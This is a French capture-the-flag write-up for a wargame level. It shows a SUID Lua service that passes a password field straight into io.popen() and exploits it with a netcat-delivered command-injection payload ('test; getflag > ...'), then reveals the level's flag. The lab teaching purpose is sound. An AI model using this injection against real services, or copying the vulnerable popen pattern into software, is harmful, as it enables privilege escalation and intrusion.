## LEVEL11

- Ce level contient un fichier `level11.lua : 
```bash
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```
- Toujours avec le bit SUID, qui permet d'exécuter le script en tant que flag11.

- Ce script contient : 
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

- En le lançant on voit :
```bash
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?
```
- on comprend que le service tourne déjà et que le script nous montre ce qu'il fait.

## EXPLOITATION

- Le script est volontairement trompeur en produisant un hash du mot de passe envoyé au service et en faisant une comparaison.

- La fail se trouve en fait dans la ligne qui produit le hash, en effet, l'entree utilisateur est directement injectée dans le premier argument de `io.popen()` qui lance une commande shell.

- Il suffit d'injecter une entrée qui va modifier la commande du script:

```bash
echo "test; getflag > /run/shm/flag" | nc 127.0.0.1 5151
```

- Le script va donc lancer :
```lua
prog = io.popen("echo test; getflag > /run/shm/flag | sha1sum", "r")
```
- Ce qui permet de recuperer le flag dans un fichier que l’on lit ensuite.


## FLAG
- fa6v5ateaw21peobuub8ipe6s

